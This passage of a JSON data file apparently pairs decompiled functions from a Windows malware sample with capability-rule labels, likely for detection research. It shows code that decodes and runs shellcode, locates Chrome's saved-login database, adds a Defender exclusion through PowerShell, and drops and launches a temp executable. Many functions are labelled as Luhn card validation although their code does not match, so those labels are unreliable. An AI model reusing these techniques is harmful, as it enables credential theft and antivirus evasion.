        "token_count": 118
    },
    "004144b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004144b6(int16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    \n    puVar4 = 0x419b90;\n    if (*param_1 == 0) {\ncode_r0x004144f2:\n        iVar3 = -1;\n    }\n    else {\n        do {\n            uVar1 = *puVar4;\n            if (uVar1 == 0) {\n                return 1;\n            }\n            uVar2 = *(param_1 + -0x20cdc8 + puVar4);\n            if (uVar2 < uVar1) goto code_r0x004144f2;\n            if (uVar1 < uVar2) {\n                return 1;\n            }\n            puVar4 = puVar4 + 1;\n        } while (*(param_1 + -0x20cdc8 + puVar4) != 0);\n        iVar3 = (*puVar4 == 0) - 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 250
    },
    "0041473a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041473a(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint lpString2;\n    \n    uVar3 = 0;\n    var_8h = param_1;\n    lpString2 = param_2;\n    iVar1 = fcn.00414422(0, &var_8h);\n    if ((iVar1 != 0) && (var_8h = *(iVar1 + 0x20) + param_1,  *(iVar1 + 0x18) != 0)) {\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(var_8h + uVar3 * 4) + param_1, lpString2);\n            if (iVar2 == 0) {\n                return *(*(iVar1 + 0x1c) + param_1 + *(*(iVar1 + 0x24) + uVar3 * 2 + param_1) * 4) + param_1;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *(iVar1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 294
    },
    "00414894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00414894(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_4h;\n    \n    in_ECX[10] = 0;\n    in_ECX[0xb] = 0;\n    puVar2 = in_ECX;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00403fc7(arg_8h + in_ECX[3], in_ECX[4]);\n    return in_ECX;\n}\n",
        "token_count": 177
    },
    "004148d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004148d1(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    in_ECX[10] = 0;\n    in_ECX[0xb] = 0;\n    puVar2 = arg_8h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *in_ECX = *puVar2;\n        puVar2 = puVar2 + 1;\n        in_ECX = in_ECX + 1;\n    }\n    fcn.00403eca(arg_8h + 10);\n    return;\n}\n",
        "token_count": 155
    },
    "004149a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004149a8(uint *lpApplicationName, uint *lpCommandLine)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_54h;\n    uint var_10h;\n    \n    fcn.00401293(&var_54h, 0, 0x44);\n    var_54h = 0x44;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                      (*lpApplicationName, *lpCommandLine, 0, 0, 0, 0, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *in_ECX = var_10h;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 172
    },
    "004157f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.004157f0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpflOldProtect;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00401000(0x800);\n    iVar5 = 0x601;\n    puVar3 = var_8h;\n    do {\n        *puVar3 = puVar3[0x41b4b0 - var_8h] ^ 0x45;\n        puVar3 = puVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(var_8h, 2000, 0x40, &lpflOldProtect);\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x1fe, 0x1000, 0x40);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(iVar5, 0x104);\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar5);\n    puVar4 = L\"\\\\System32\\\\cmd.exe\";\n    puVar6 = iVar5 + iVar1 * 2;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    (*(var_8h + 0xef))(iVar5, var_4h, 0, 0);\n    return;\n}\n",
        "token_count": 409
    },
    "00415cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415cc4(uint noname_0, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t arg_10h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int32_t in_EDX;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401293();\n    piVar4 = arg_ch;\n    do {\n        iVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n    } while (iVar1 != 0);\n    iVar5 = piVar4 - (arg_ch + 1) >> 1;\n    iVar2 = fcn.00401098(L\"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\", L\"Default\");\n    if (iVar2 != 0) {\n        iVar3 = iVar2 + -0x41a0e0 >> 1;\n        arg_10h = iVar3 * 2;\n        fcn.0040126d(in_EDX, L\"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\", arg_10h);\n        fcn.0040126d(in_EDX + arg_10h, arg_ch, iVar5 * 2);\n        piVar4 = iVar2 + 0xe;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        fcn.0040126d(in_EDX + (iVar3 + iVar5) * 2, iVar2 + 0xe, (piVar4 - (iVar2 + 0x10) >> 1) * 2 + 2);\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "00415dc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415dc4(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    uint arg_8h_01;\n    uint *in_ECX;\n    uint in_EDX;\n    uint var_4h;\n    \n    *in_ECX = 0;\n    if (arg_8h != 0) {\n        arg_8h_00 = fcn.00401000(arg_8h + 2);\n        fcn.00401293(arg_8h_00, 0, arg_8h + 2);\n        fcn.0040126d(arg_8h_00, in_EDX, arg_8h);\n        arg_8h_01 = fcn.0040460a(arg_8h_00);\n        fcn.004043c7(arg_8h_01);\n        fcn.00406f1d();\n        fcn.00401014(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00415e92": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00415e92(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    int32_t lpflOldProtect;\n    uint32_t var_4h;\n    \n    uVar3 = 0;\n    lpflOldProtect = param_1;\n    var_4h = param_2;\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_2, 0x1000, 4);\n    puVar2 = (var_4h - 1) + param_1;\n    do {\n        *(uVar3 + iVar1) = ~*puVar2;\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + -1;\n    } while (uVar3 <= var_4h);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(iVar1, var_4h, 0x40, &lpflOldProtect);\n    return iVar1;\n}\n",
        "token_count": 243
    },
    "004160c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate processes/f67bedfed7e245aa9b0908c198426ab8",
            "contain loop",
            "enumerate processes"
        ],
        "decompiled_code": "\nuint fcn.004160c3(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_104h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    fcn.00401293(&var_124h, 0, 0x124);\n    var_128h = 0x128;\n    iVar2 = (*_sym.imp.KERNEL32.dll_Process32First)(uVar1, &var_128h);\n    do {\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n            return 0;\n        }\n        iVar2 = 0;\n        while (*(&var_104h + iVar2) == *(iVar2 + 0x41c7f0)) {\n            iVar2 = iVar2 + 1;\n            if (iVar2 == 0xd) {\n                return var_120h;\n            }\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32Next)(uVar1, &var_128h);\n    } while( true );\n}\n",
        "token_count": 271
    },
    "004166ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004166ec(uint *param_1)\n\n{\n    *param_1 = 0x41c85c;\n    fcn.00406f1d();\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(param_1[3], 0, 0x8000);\n    return;\n}\n",
        "token_count": 73
    },
    "00417022": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417022(int32_t **arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    int32_t in_ECX;\n    \n    arg_8h_00 = **arg_8h;\n    arg_8h_01 = fcn.00415dc4(arg_8h_00);\n    fcn.004043c7(arg_8h_01);\n    fcn.00406f1d();\n    *(in_ECX + 4) = *(*arg_8h + arg_8h_00 + 4);\n    return;\n}\n",
        "token_count": 140
    },
    "00417083": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00417083(void)\n\n{\n    ushort *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_4h;\n    \n    puVar1 = fcn.00401000(0x100);\n    puVar2 = fcn.00401000(0x100);\n    fcn.00401293(puVar1, 0, 0x100);\n    fcn.00401293(puVar2, 0, 0x100);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, puVar1, 0x100);\n    puVar4 = \"powershell Add-MpPreference -ExclusionPath \";\n    puVar5 = puVar2;\n    for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = *puVar4;\n    *(puVar5 + 2) = *(puVar4 + 2);\n    *(puVar2 + 0x2b) = *puVar1;\n    *(puVar2 + 0x2d) = *(puVar1 + 1);\n    puVar4 = puVar2;\n    do {\n        puVar5 = puVar4;\n        puVar4 = puVar5 + 1;\n    } while (*puVar5 != '\\0');\n    *puVar5 = *(puVar1 + 0xff);\n    (*_sym.imp.KERNEL32.dll_WinExec)(puVar2, 0);\n    return;\n}\n",
        "token_count": 390
    },
    "0041711c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041711c(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.00415dc4(*(*arg_8h + 4));\n    fcn.004043c7(arg_8h_00);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 109
    },
    "00417160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create or open file",
            "get common file path",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417160(uint *arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint var_c44h;\n    uint var_844h;\n    uint var_444h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = in_ECX + 4;\n    uVar3 = fcn.00415dc4(**arg_8h);\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(0, arg_8h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_SizeofResource)(0, arg_8h);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(uVar3);\n    fcn.00401293(&var_444h, 0, 0x400);\n    fcn.00401293(&var_844h, 0, 0x400);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetTempPathA;\n    (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x400, &var_444h);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(&var_444h, \"find.exe\");\n    (*pcVar1)(0x400, &var_844h);\n    (*pcVar2)(&var_844h, \"find.db\");\n    uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileA)(&var_444h, 0x10000000, 1, 0, 2, 0x84, 0);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(uVar5, uVar3, uVar4, &var_8h, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    fcn.00401293(&var_c44h, 0, 0x400);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_c44h, \"-w %ws -d C -f %s\", *var_4h, &var_844h);\n    var_34h = &var_444h;\n    var_44h = 0x3c;\n    var_30h = &var_c44h;\n    var_40h = 0x40;\n    _var_20h = 0;\n    _var_18h = 0;\n    _var_10h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExA)(&var_44h);\n    return;\n}\n",
        "token_count": 774
    },
    "004172fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004172fe(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_81ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00401293(&var_81ch, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x400, &var_81ch);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_81ch, 0x41c90c);\n    arg_8h_00 = fcn.0040460a(&var_81ch);\n    fcn.004043c7(arg_8h_00);\n    fcn.00406f1d();\n    var_18h = 0;\n    var_1ch = 0x35;\n    _var_14h = ZEXT816(0);\n    fcn.00404788(in_ECX + 4);\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 275
    },
    "004174a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004174a1(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x41c924;\n    iVar1 = param_1[1];\n    if (iVar1 != 0) {\n        fcn.00401c7a(iVar1);\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 111
    },
    "00417768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00417768(uint arg_8h)\n\n{\n    uint var_224h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00401293(&var_224h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &var_224h);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_224h, L\"\\\\Microsoft Vision\\\\\");\n    fcn.004043fa(&var_224h);\n    var_1ch = 0x3b;\n    var_18h = 0;\n    _var_14h = ZEXT816(0);\n    fcn.00404788(&var_4h);\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    fcn.00406f1d();\n    return arg_8h;\n}\n",
        "token_count": 253
    },
    "00417bbe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00417bbe(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpString2;\n    uint lpString2_00;\n    uint lpString2_01;\n    uint lpString2_02;\n    uint arg_8h;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x552018 = 0;\n    *0x55201c = 0;\n    *0x552024 = 0;\n    *0x552020 = 0;\n    *0x552028 = 0;\n    *0x55202c = 0;\n    *0x552034 = 0;\n    *0x552038 = 0;\n    *0x552040 = 0;\n    *0x55203c = 0;\n    *0x552044 = 0;\n    *0x552048 = 0;\n    *0x552050 = 0;\n    *0x552054 = 0;\n    *0x55205c = 0;\n    *0x552058 = 0;\n    *0x552060 = 0;\n    *0x552064 = 0;\n    *0x55206c = 0;\n    *0x552070 = 0;\n    *0x552078 = 0;\n    *0x552074 = 0;\n    *0x55207c = 0;\n    *0x552080 = 0;\n    *0x552088 = 0;\n    *0x55208c = 0;\n    *0x552094 = 0;\n    *0x552090 = 0;\n    *0x552098 = 0;\n    *0x55209c = 0;\n    *0x5520a4 = 0;\n    *0x5520a8 = 0;\n    *0x5520b0 = 0;\n    *0x5520ac = 0;\n    *0x5520b4 = 0;\n    *0x5520b8 = 0;\n    *0x552030 = 0;\n    *0x55204c = 0;\n    *0x552068 = 0;\n    *0x552084 = 0;\n    *0x5520a0 = 0;\n    *0x5520bc = 0;\n    uVar1 = fcn.00401000(0x19);\n    uVar2 = fcn.00401000(0x19);\n    lpString2 = fcn.00401000(0x19);\n    lpString2_00 = fcn.00401000(0x19);\n    lpString2_01 = fcn.00401000(0x19);\n    lpString2_02 = fcn.00401000(0x19);\n    fcn.00415c2e();\n    fcn.00415c2e();\n    fcn.00415c2e();\n    fcn.00415c2e();\n    fcn.00415c2e();\n    fcn.00415c2e();\n    uVar1 = fcn.0040434f(uVar1);\n    fcn.00413aec(uVar1);\n    fcn.00406f1d();\n    uVar1 = extraout_ECX;\n    arg_8h = fcn.0040434f(uVar2);\n    fcn.00413aec(arg_8h);\n    fcn.00406f1d(arg_8h, uVar2, uVar1);\n    uVar1 = extraout_ECX_00;\n    uVar2 = fcn.0040434f(lpString2);\n    fcn.00413aec(uVar2);\n    fcn.00406f1d(uVar2, lpString2, uVar1);\n    uVar1 = extraout_ECX_01;\n    uVar2 = fcn.0040434f(lpString2_00);\n    fcn.00413aec(uVar2);\n    fcn.00406f1d(uVar2, lpString2_00, uVar1);\n    uVar1 = extraout_ECX_02;\n    uVar2 = fcn.0040434f(lpString2_01);\n    fcn.00413aec(uVar2);\n    fcn.00406f1d(uVar2, lpString2_01, uVar1);\n    uVar1 = extraout_ECX_03;\n    uVar2 = fcn.0040434f(lpString2_02);\n    fcn.00413aec(uVar2);\n    fcn.00406f1d(uVar2, lpString2_02, uVar1);\n    return 0x552018;\n}\n",
        "token_count": 1094
    },
    "00417fd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417fd8(uint arg_8h)\n\n{\n    fcn.00403eca(&arg_8h);\n    fcn.00404081();\n    return;\n}\n",
        "token_count": 43
    },
    "00418056": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00418056(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x100);\n    fcn.00401293(&var_108h, 0, 0xf2);\n    var_110h = *in_ECX;\n    var_4h = &var_110h;\n    var_10ch = in_ECX[1];\n    var_ch = arg_ch;\n    var_8h = uVar1;\n    fcn.004024bb(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 217
    },
    "00401419": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401419(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY32;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x401434;\n    fcn.00401719();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.00401766(&stack0xffffffe0, arg_ch);\n            fcn.00401618(arg_8h_00, arg_ch, uStackY32, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0040147b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040147b(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x401496;\n    fcn.004018ac();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.004018fe(&stack0xffffffe4, arg_ch);\n            fcn.004017a5(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "004014dd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014dd(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x4014f8;\n    fcn.00401a34();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.00401a81(&stack0xffffffe4, arg_ch);\n            fcn.0040193f(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "0040153f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040153f(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStack20 = 0x40155a;\n    fcn.00401bbd();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffd8;\n            fcn.00401c0a(&stack0xffffffd8, arg_ch);\n            fcn.00401abc(arg_8h_00, arg_ch, uStack40, uStack36, uStack32);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "00401fd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401fd0(int32_t arg_8h)\n\n{\n    uint32_t arg_ch;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar *arg_8h_00;\n    \n    uStack20 = 0x401fdd;\n    fcn.00401bbd();\n    arg_ch = 0;\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffd8;\n            fcn.00401c0a(&stack0xffffffd8, arg_ch);\n            fcn.00401abc(arg_8h_00, arg_ch, uStack40, uStack36, uStack32);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "00402917": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402917(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStackY32 [12];\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x402932;\n    fcn.004029af();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.00402a03(&stack0xffffffe0, arg_ch);\n            fcn.0040283b(arg_8h_00);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "00404b3b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b3b(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack52;\n    uchar auStack48 [16];\n    \n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    fcn.00404767(*(in_ECX + 0x18));\n    fcn.00404788(in_ECX + 4);\n    if (*(in_ECX + 0x10) != 0) {\n        do {\n            arg_8h_00 = fcn.00401c0a(auStack48 + 8, arg_ch);\n            fcn.00404788(arg_8h_00);\n            fcn.00406f1d();\n            iVar1 = fcn.00401c0a(&uStack52, arg_ch);\n            fcn.00404767(*(iVar1 + 0x10));\n            fcn.00406f1d();\n            iVar1 = fcn.00401c0a(&stack0xffffffc0, arg_ch);\n            fcn.00404740(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00406f1d();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0x10));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 351
    },
    "004053f2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
